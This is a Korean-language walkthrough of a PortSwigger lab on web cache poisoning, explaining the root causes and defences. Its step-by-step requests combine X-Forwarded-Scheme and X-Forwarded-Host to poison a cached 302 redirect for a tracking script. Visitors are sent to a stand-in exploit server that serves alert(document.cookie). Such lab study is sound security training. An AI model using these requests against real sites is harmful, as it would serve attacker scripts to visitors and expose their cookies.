# Lab: Web cache poisoning with multiple headers

## 개요

- **난이도**: Practitioner
- **주제**: Web Cache Poisoning — 다중 unkeyed 헤더(`X-Forwarded-Scheme` + `X-Forwarded-Host`) / 캐시된 302 리다이렉트 조작
- **링크**: https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers

## 목표

두 개의 헤더를 조합해 캐시된 302 리다이렉트를 공격자 서버로 유도하고, 방문자 브라우저에서 `alert(document.cookie)` 를 실행시킨다.

## 취약 지점 — 두 헤더의 조합

```
[단독으로는 효과 없음]
  X-Forwarded-Host: example.com          → 응답 변화 없음
  X-Forwarded-Scheme: nothttps           → 같은 URL 을 https:// 로 리다이렉트 (302)

[조합]
  X-Forwarded-Scheme: nothttps
  X-Forwarded-Host: example.com
  → 302 Location: https://example.com/   ← 호스트가 헤더 값으로 결정
```

즉, 서버가 **scheme 판단(X-Forwarded-Scheme)** 과 **호스트 생성(X-Forwarded-Host)** 을
모두 클라이언트 헤더에 의존한다. 두 값 모두 캐시 키에 없어 응답이 캐시되면 오염된다.

### 공격 대상 경로

```
홈 페이지는 다음 리소스를 임포트한다:
  /resources/js/tracking.js

이 경로에 대한 응답(302) 을 캐시에 오염시키면,
방문자는 tracking.js 를 로드할 때 공격자 서버로 리다이렉트됨.
```

## 공격 단계

### 1단계 — JS 리소스 요청 확인

홈 페이지 로드 시 `/resources/js/tracking.js` 요청을 Burp Repeater 로 보낸다.

```
GET /resources/js/tracking.js HTTP/1.1
```

### 2단계 — 캐시 버스터 + 헤더 실험

```
GET /resources/js/tracking.js?cb=1234
X-Forwarded-Host: example.com
→ 효과 없음
```

`X-Forwarded-Host` 를 제거하고 `X-Forwarded-Scheme` 를 추가한다.

```
GET /resources/js/tracking.js?cb=1234
X-Forwarded-Scheme: nothttps
→ 302 Location: https://LAB-ID.../resources/js/tracking.js (같은 URL, https)
```

다시 `X-Forwarded-Host: example.com` 을 추가한다.

```
X-Forwarded-Scheme: nothttps
X-Forwarded-Host: example.com
→ 302 Location: https://example.com/resources/js/tracking.js
```

호스트가 헤더 값으로 조작됨을 확인.

### 3단계 — 익스플로잇 서버 준비

익스플로잇 서버 파일 이름을 취약 경로와 동일하게 맞춘다.

```
파일 경로/이름: /resources/js/tracking.js
본문:          alert(document.cookie)
```

### 4단계 — 캐시 오염

```
GET /resources/js/tracking.js HTTP/1.1
X-Forwarded-Scheme: nothttps
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

응답에 익스플로잇 서버 URL 이 반영되고 `X-Cache: hit` 가 나올 때까지 재전송.

### 5단계 — 확인

Burp 에서 `Copy URL` 로 URL 을 복사해 브라우저로 열면,
리다이렉트된 스크립트(`alert(document.cookie)`)가 응답에 포함됨을 확인한다.
(이 시점에는 alert 가 실행되지 않을 수 있음)

### 6단계 — 피해자 유도 및 유지

cache-buster 를 제거하고 다시 오염시킨 뒤, 홈 페이지를 열어 `alert()` 발생을 확인한다.
사용자가 약 1분에 한 번 방문하므로, 해결될 때까지 재전송으로 캐시를 계속 오염 상태로 유지한다.

## 왜 "다중 헤더" 인가

```
[리다이렉트 발생 조건]
  X-Forwarded-Scheme != HTTPS  (즉, http 로 인식시켜야 https 로 리다이렉트)

[리다이렉트 목적지 호스트]
  X-Forwarded-Host 값

→ 하나만으로는 공격 불가, 둘을 함께 보내야 함
```

## 방어

```
[근본 원인]
  1) scheme/호스트 판단을 클라이언트 헤더(X-Forwarded-Scheme/Host)에 의존
  2) 리다이렉트 응답이 캐시됨 (unkeyed)
  3) 헤더가 캐시 키에 없음

[올바른 방어]
  1. 클라이언트 제공 헤더를 신뢰하지 않음
     - 리다이렉트/URL 생성은 설정된 정식 도메인·scheme 사용
     - X-Forwarded-* 를 응답/리다이렉트에 반영하지 않음
  2. 캐시 키 설계
     - 응답에 영향을 주는 입력을 캐시 키에 포함
     - 안전하지 않다면 리다이렉트 응답은 캐시하지 않음(Cache-Control: no-store)
  3. 프록시 경계에서 X-Forwarded-* 정규화/덮어쓰기
  4. 서브리소스 무결성(SRI)·CSP 로 외부 스크립트 로드 완화
  5. HTTPS 리다이렉트는 고정 scheme + 고정 호스트로 처리

[주의]
  단일 헤더 검사만으로 안전하다고 판단하면 안 된다.
  여러 헤더의 조합이 리다이렉트/URL 생성에 영향을 줄 수 있다.
```

## 핵심 정리

- `X-Forwarded-Scheme != HTTPS` 로 302 리다이렉트를 유발하고, `X-Forwarded-Host` 로 그 목적지 호스트를 조작해 공격자 서버로 유도했다.
- `/resources/js/tracking.js` 응답(302)을 캐시에 오염시켜 방문자가 공격자 스크립트를 로드하게 만들었다.
- 단일 헤더로는 불가능하고 **두 헤더의 조합**이 필요했다.
- 방어는 헤더 불신(정식 scheme/호스트 사용)과 리다이렉트 응답의 캐시 통제다.

## 배운 점

- 001(헤더), 002(쿠키)에 이어 이번에는 **여러 헤더의 조합**으로 harmful response 를 유도했다.
- 리다이렉트 응답도 캐시되면 강력한 오염 벡터가 된다(캐시된 오픈 리다이렉트).
- X-Forwarded-Scheme/Host 계열은 Host 헤더 신뢰 문제의 연장이며, 011(비밀번호 재설정 중독)·001(캐시)과 같은 뿌리다.
- 캐시 오염 분석은 "어떤 입력이 응답에 영향을 주는가 + 그 입력이 캐시 키에 있는가" 로 정리된다.
